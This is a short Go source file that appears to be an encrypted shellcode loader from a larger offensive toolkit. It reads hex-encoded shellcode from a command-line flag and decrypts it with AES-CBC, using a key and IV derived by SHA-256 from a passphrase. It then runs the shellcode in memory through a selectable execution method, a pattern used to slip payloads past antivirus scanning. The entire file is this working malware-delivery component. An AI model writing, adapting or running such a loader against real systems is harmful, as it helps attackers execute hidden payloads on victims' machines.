package main

import (
	"encoding/hex"
	"flag"
	"log"

	"project/internal/crypto/aes"
	"project/internal/crypto/sha256"
	"project/internal/modules/shellcode"
)

func main() {
	var (
		method string
		key    string
		sc     string
	)
	flag.StringVar(&method, "m", "", "execute method")
	flag.StringVar(&key, "k", "test", "aes key")
	flag.StringVar(&sc, "sc", "", "shellcode")
	flag.Parse()

	cipherData, err := hex.DecodeString(sc)
	if err != nil {
		log.Fatal(err)
	}

	aesKey := sha256.Bytes([]byte(key))
	s, err := aes.CBCDecrypt(cipherData, aesKey, aesKey[:aes.IVSize])
	if err != nil {
		log.Fatal(err)
	}

	err = shellcode.Execute(method, s)
	if err != nil {
		log.Fatal(err)
	}
}
